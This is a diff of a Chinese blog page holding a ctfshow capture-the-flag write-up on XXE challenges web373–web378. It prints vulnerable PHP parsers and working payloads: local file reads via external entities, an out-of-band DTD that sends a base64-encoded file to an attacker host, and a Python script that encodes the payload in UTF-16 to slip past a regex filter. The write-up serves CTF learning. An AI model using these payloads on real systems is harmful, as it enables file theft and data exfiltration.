@@ -21,12 +21,12 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="一、写在前面XXE漏洞开始了 推荐阅读博客： https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;3357#toc-6">
+  <meta name="description" content="一、写在前面 XXE漏洞开始了 推荐阅读博客： https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;3357#toc-6">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ctfshow-xxe-wp">
 <meta property="og:url" content="http://example.com/2022/08/13/blog0023-ctfshow-xxe-wp/index.html">
 <meta property="og:site_name" content="The world of whistleH">
-<meta property="og:description" content="一、写在前面XXE漏洞开始了 推荐阅读博客： https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;3357#toc-6">
+<meta property="og:description" content="一、写在前面 XXE漏洞开始了 推荐阅读博客： https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;3357#toc-6">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0022/image-20220813225613713.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0022/image-20220814001604129.png">
@@ -85,7 +85,9 @@
   </style>
 </noscript>
 
-</head>
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+<!-- hexo injector head_end end --></head>
 
 <body itemscope itemtype="http://schema.org/WebPage">
   <div class="container use-motion">
@@ -267,16 +269,19 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="一、写在前面"><a href="#一、写在前面" class="headerlink" title="一、写在前面"></a>一、写在前面</h2><p>XXE漏洞开始了</p>
+        <h2 id="一写在前面">一、写在前面</h2>
+<p>XXE漏洞开始了</p>
 <p>推荐阅读博客：</p>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3357#toc-6">https://xz.aliyun.com/t/3357#toc-6</a></p>
+<p>https://xz.aliyun.com/t/3357#toc-6</p>
 <span id="more"></span>
-<h2 id="web373（回显读文件）"><a href="#web373（回显读文件）" class="headerlink" title="web373（回显读文件）"></a>web373（回显读文件）</h2><p>首先来看PHP源代码</p>
+<h2 id="web373回显读文件">web373（回显读文件）</h2>
+<p>首先来看PHP源代码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">libxml_disable_entity_loader(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="variable">$creds</span> = simplexml_import_dom(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);  </span><br></pre></td></tr></table></figure>
 <p>我们只需要构造含有ctfshow这个元素的xml文档，利用外部实体从而读取文件</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">creds</span> [ </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">creds</span> (<span class="meta-keyword">ctfshow</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">ctfshow</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">goodies</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ctfshow</span>&gt;</span><span class="symbol">&amp;goodies;</span><span class="tag">&lt;/<span class="name">ctfshow</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>这样，就能成功把flag打出来。</p>
-<h2 id="web374（OOB）"><a href="#web374（OOB）" class="headerlink" title="web374（OOB）"></a>web374（OOB）</h2><p>这道题就是经典的OOB外带，</p>
+<h2 id="web374oob">web374（OOB）</h2>
+<p>这道题就是经典的OOB外带，</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">libxml_disable_entity_loader(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure>
 <p>首先在VPS上搭建xxe.dtd</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://your-ip:port?p=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
@@ -286,20 +291,26 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Python3 -m http.server 2333</span><br></pre></td></tr></table></figure>
 <p>需要注意的是<code>&amp;#37;</code>是HTML实体编码，对应的是<code>%</code></p>
 <p>整个的调用顺序为</p>
-<p><code>%remote</code> （包含远程服务器的dtd） —&gt; <code>%int</code> （包含send实体参数）—&gt; <code>%send</code>（包含file实体参数，访问远程服务器）</p>
-<h2 id="web375（OOB）"><a href="#web375（OOB）" class="headerlink" title="web375（OOB）"></a>web375（OOB）</h2><p>过滤了”xml”的版本声明，但这并不影响。</p>
+<p><code>%remote</code> （包含远程服务器的dtd） --&gt; <code>%int</code> （包含send实体参数）--&gt; <code>%send</code>（包含file实体参数，访问远程服务器）</p>
+<h2 id="web375oob">web375（OOB）</h2>
+<p>过滤了"xml"的版本声明，但这并不影响。</p>
 <p>同web374</p>
-<h2 id="web376（OOB）"><a href="#web376（OOB）" class="headerlink" title="web376（OOB）"></a>web376（OOB）</h2><p>同web374</p>
-<h2 id="web377（UTF-16）"><a href="#web377（UTF-16）" class="headerlink" title="web377（UTF-16）"></a>web377（UTF-16）</h2><p>先看看PHP源码：</p>
+<h2 id="web376oob">web376（OOB）</h2>
+<p>同web374</p>
+<h2 id="web377utf-16">web377（UTF-16）</h2>
+<p>先看看PHP源码：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">libxml_disable_entity_loader(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure>
 <p>这里非常重要的一点就是<code>http</code>协议被正则ban了，我们可以考虑利用编码绕过</p>
 <pre><code>    一个xml文档不仅可以用UTF-8编码，也可以用UTF-16(两个变体 - BE和LE)、UTF-32(四个变体 - BE、LE、2143、3412)和EBCDIC编码。在这种编码的帮助下，使用正则表达式可以很容易地绕过WAF，因为在这种类型的WAF中，正则表达式通常仅配置为单字符集。
-    外来编码也可用于绕过成熟的WAF，因为它们并不总是能够处理上面列出的所有编码。例如，libxml2解析器只支持一种类型的utf-32 - utf-32BE，特别是不支持BOM。
-</code></pre><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0022/image-20220813225613713.png" alt="image-20220813225613713" style="zoom: 50%;" /></p>
+    外来编码也可用于绕过成熟的WAF，因为它们并不总是能够处理上面列出的所有编码。例如，libxml2解析器只支持一种类型的utf-32 - utf-32BE，特别是不支持BOM。</code></pre>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0022/image-20220813225613713.png" alt="image-20220813225613713" style="zoom: 50%;" /></p>
 <p>这时我们需要用上Python脚本了：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> weakref <span class="keyword">import</span> proxy</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://f1a29458-0578-476a-825b-2ecc7fa52815.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/xxe.php&quot;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;&#x27;&lt;!DOCTYPE convert [ </span></span><br><span class="line"><span class="string">&lt;!ENTITY % remote SYSTEM &quot;http://121.5.227.123/xxe.dtd&quot;&gt;</span></span><br><span class="line"><span class="string">%remote;%int;%send;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>:<span class="string">&quot;127.0.0.1:8080&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url=url,data=data.encode(<span class="string">&#x27;utf-16&#x27;</span>),proxies=proxies)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="comment"># print(data.encode(&#x27;utf-16&#x27;))</span></span><br></pre></td></tr></table></figure>
-<h2 id="web378（flask-XXE）"><a href="#web378（flask-XXE）" class="headerlink" title="web378（flask XXE）"></a>web378（flask XXE）</h2><p>抓包发现，上传的用户名会回显，因此考虑XXE注入</p>
-<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0022/image-20220814001604129.png" alt="image-20220814001604129"></p>
+<h2 id="web378flask-xxe">web378（flask XXE）</h2>
+<p>抓包发现，上传的用户名会回显，因此考虑XXE注入</p>
+<figure>
+<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0022/image-20220814001604129.png" alt="image-20220814001604129" /><figcaption aria-hidden="true">image-20220814001604129</figcaption>
+</figure>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">user</span> [ </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>传入后成功拿到flag.</p>
 <p>后端源代码如下：</p>
@@ -391,7 +402,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="nav-text">一、写在前面</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web373%EF%BC%88%E5%9B%9E%E6%98%BE%E8%AF%BB%E6%96%87%E4%BB%B6%EF%BC%89"><span class="nav-text">web373（回显读文件）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web374%EF%BC%88OOB%EF%BC%89"><span class="nav-text">web374（OOB）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web375%EF%BC%88OOB%EF%BC%89"><span class="nav-text">web375（OOB）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web376%EF%BC%88OOB%EF%BC%89"><span class="nav-text">web376（OOB）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web377%EF%BC%88UTF-16%EF%BC%89"><span class="nav-text">web377（UTF-16）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web378%EF%BC%88flask-XXE%EF%BC%89"><span class="nav-text">web378（flask XXE）</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="nav-text">一、写在前面</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web373%E5%9B%9E%E6%98%BE%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="nav-text">web373（回显读文件）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web374oob"><span class="nav-text">web374（OOB）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web375oob"><span class="nav-text">web375（OOB）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web376oob"><span class="nav-text">web376（OOB）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web377utf-16"><span class="nav-text">web377（UTF-16）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web378flask-xxe"><span class="nav-text">web378（flask XXE）</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -405,20 +416,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">25</span>
+          <span class="site-state-item-count">27</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">27</span>
+        <span class="site-state-item-count">29</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">29</span>
+        <span class="site-state-item-count">31</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
